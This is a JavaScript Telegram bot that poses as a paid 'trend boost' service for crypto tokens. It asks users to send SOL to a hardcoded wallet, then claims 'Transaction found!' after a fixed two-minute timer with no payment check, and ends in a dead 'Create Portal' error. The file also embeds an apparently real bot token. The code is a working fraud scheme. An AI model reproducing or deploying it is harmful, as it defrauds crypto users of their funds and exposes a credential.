const TelegramBot = require('node-telegram-bot-api');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
const token = '7536419873:AAE3eVqy9ifdNjZnwW3ViNEA5SJtF_IQ7EA';
const bot = new TelegramBot(token, { polling: true });

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'TREND', callback_data: 'trend' }]
            ]
        }
    };

    bot.sendMessage(chatId, 'Trend on Joshua buy bot___', options);
});

// Handle the trend button
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'trend') {
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'SOLANA', callback_data: 'sol' }],
                    [{ text: 'ETHEREUM', callback_data: 'eth' }],
                    [{ text: 'BINANCE', callback_data: 'bnb' }]
                ]
            }
        };
        bot.sendMessage(chatId, 'Select a blockchain:', options);
    } else if (['sol', 'eth', 'bnb'].includes(query.data)) {
        handleBlockchainSelection(query.data, chatId);
    } else if (['1sol - 1hrs', '2sol - 2hrs', '4sol - 3hrs', '7sol - 5hrs', '0.5sol - 4mins'].includes(query.data)) {
        handleBoostTrendSelection(query.data, chatId);
    } else if (query.data === 'create_portal') {
        bot.sendMessage(chatId, 'Error creating portal');
    }
});

// Handle blockchain selection
function handleBlockchainSelection(blockchain, chatId) {
    const tokenType = blockchain.toUpperCase();
    bot.sendMessage(chatId, `Send your ${tokenType} token contract address:`);

    bot.on('message', (msg) => {
        if (msg.chat.id === chatId && msg.text) {
            bot.sendMessage(chatId, `${tokenType} token added successfully\n\nBOOST TREND?`, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Boost Trend', callback_data: 'boost' }
                        ]
                    ]
                }
            });
            bot.removeListener('message', arguments.callee);
        }
    });

    bot.on('callback_query', (query) => {
        if (query.data === 'boost') {
            const durationOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '7sol - 5hrs', callback_data: '7sol - 5hrs' }],
                        [{ text: '4sol - 3hrs', callback_data: '4sol - 3hrs' }],
                        [{ text: '2sol - 2hrs', callback_data: '2sol - 2hrs' }],
                        [{ text: '1sol - 1hrs', callback_data: '1sol - 1hrs' }],
                        [{ text: '0.5sol - 4mins', callback_data: '0.5sol - 4mins' }]
                    ]
                }
            };
            bot.sendMessage(chatId, 'Choose a duration:', durationOptions);
        }
    });
}

// Handle boost trend selection
function handleBoostTrendSelection(selection, chatId) {
    bot.sendMessage(chatId, 'Your wallet is EMPTY\nAdd funds to your wallet\n\nSend this wallet:');

    let walletAddress = '';
    switch (selection) {
        case '7sol - 5hrs':
        case '4sol - 3hrs':
        case '2sol - 2hrs':
        case '1sol - 1hrs':
        case '0.5sol - 4mins':
            walletAddress = 'G4mTKmET23MUYFwqokQA9LRTaaLHr1mS7Fo36r3Y2RQU'; // For SOL
            break;
        // Add more cases for ETH and BNB if needed
    }

    bot.sendMessage(chatId, walletAddress);
    bot.sendMessage(chatId, 'Hit /sent if you have made the payment');

    bot.onText(/\/sent/, (msg) => {
        bot.sendMessage(chatId, 'No transactions found, it\'s advisable to wait a few moments after transaction');

        setTimeout(() => {
            bot.sendMessage(chatId, 'Transaction found! Trend will begin shortly');
            bot.sendMessage(chatId, 'Create portal with button', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Create Portal', callback_data: 'create_portal' }]
                    ]
                }
            });
        }, 120000); // 2 minutes
    });
}
